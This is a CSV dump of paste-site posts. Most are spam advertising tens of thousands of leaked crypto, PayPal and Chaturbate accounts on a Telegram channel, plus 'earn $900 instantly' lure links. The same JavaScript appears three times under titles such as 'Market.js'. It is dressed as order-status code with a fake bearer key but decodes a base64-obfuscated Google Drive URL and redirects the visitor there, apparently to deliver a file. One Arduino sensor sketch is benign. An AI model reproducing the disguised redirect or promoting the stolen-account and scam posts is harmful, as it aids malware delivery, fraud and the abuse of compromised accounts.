id,title,username,language,date,content
pHHdEMf8,Crypto Accounts,WantingTrae,JavaScript,Friday 25th of April 2025 06:52:56 PM CDT,97123 Accounts Posted On https://t.me/leakedbyem1nem
tpJFmeb2,EARN $900 INSTANTLY 2025 M6,furAldy,JavaScript,Friday 25th of April 2025 06:44:50 PM CDT," 
Pdf https://tinyurl.com/privguidee

Shf7FiqTF7
"
ff1PmxAc,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 25th of April 2025 06:37:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ixVPMqr6,PayPal with Balance,WantingTrae,JavaScript,Friday 25th of April 2025 06:37:33 PM CDT,70052 Accounts Posted On https://t.me/leakedbyem1nem
pSJL9kzF,Make $1000 15-MINUTES (BEGINNER) 96,furAldy,JavaScript,Friday 25th of April 2025 06:35:34 PM CDT," 
Pdf https://tinyurl.com/privguidee

pzbI14w7TC
"
aPVuWA0R,"""Proximity Detection"" rev_01",pleasedontcode,Arduino,Friday 25th of April 2025 06:30:15 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Proximity Detection""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-04-25 23:29:35

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Utilizes an HC-SR04 ultrasonic sensor to sense */
	/* pedestrian proximity, generating a signal for */
	/* system activation. Aims for precise detection and */
	/* reliable performance in smart traffic management */
	/* systems. the traffic light will turn red */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Ultrasonic.h>	//https://github.com/ErickSimoes/Ultrasonic

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs();
void checkProximity();

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t pedestriansensor_HC-SR04_Echo_PIN_D3		= 3;

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t pedestriansensor_HC-SR04_Trigger_PIN_D2		= 2;
const uint8_t myLED_LED_PIN_D4		= 4;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool	pedestriansensor_HC-SR04_Trigger_PIN_D2_rawData		= 0;
bool	myLED_LED_PIN_D4_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float	pedestriansensor_HC-SR04_Trigger_PIN_D2_phyData		= 0.0;
float	myLED_LED_PIN_D4_phyData		= 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// Create an instance of the Ultrasonic class
Ultrasonic ultrasonic(pedestriansensor_HC-SR04_Trigger_PIN_D2, pedestriansensor_HC-SR04_Echo_PIN_D3);

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(pedestriansensor_HC-SR04_Echo_PIN_D3, INPUT);
	pinMode(pedestriansensor_HC-SR04_Trigger_PIN_D2, OUTPUT);
	pinMode(myLED_LED_PIN_D4, OUTPUT);
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	checkProximity(); // Check for pedestrian proximity
	updateOutputs(); // Refresh output data
}

void checkProximity()
{
	// Read distance from the ultrasonic sensor
	pedestriansensor_HC-SR04_Trigger_PIN_D2_phyData = ultrasonic.read();

	// Check if the distance is below a certain threshold (e.g., 50 cm)
	if (pedestriansensor_HC-SR04_Trigger_PIN_D2_phyData < 50) {
		myLED_LED_PIN_D4_rawData = HIGH; // Turn on the LED (traffic light turns red)
	} else {
		myLED_LED_PIN_D4_rawData = LOW; // Turn off the LED
	}
}

void updateOutputs()
{
	digitalWrite(pedestriansensor_HC-SR04_Trigger_PIN_D2, pedestriansensor_HC-SR04_Trigger_PIN_D2_rawData);
	digitalWrite(myLED_LED_PIN_D4, myLED_LED_PIN_D4_rawData);
}

/* END CODE */"
hwy9AAas,EARN $900 INSTANTLY 2025⭐ NU,furAldy,JavaScript,Friday 25th of April 2025 06:26:14 PM CDT," 
Pdf https://tinyurl.com/privguidee

6jPKAwpwvC
"
7TbqLKFF,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 25th of April 2025 06:22:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17355/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UbwF5eur,Leaked Accounts - Fresh Hits,WantingTrae,JavaScript,Friday 25th of April 2025 06:22:11 PM CDT,25120 Accounts Posted On https://t.me/leakedbyem1nem
K9q73Kuu,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 25th of April 2025 06:06:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05789/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ea0eXet0,Chaturbate with Tokens,WantingTrae,JavaScript,Friday 25th of April 2025 06:06:48 PM CDT,47782 Accounts Posted On https://t.me/leakedbyem1nem
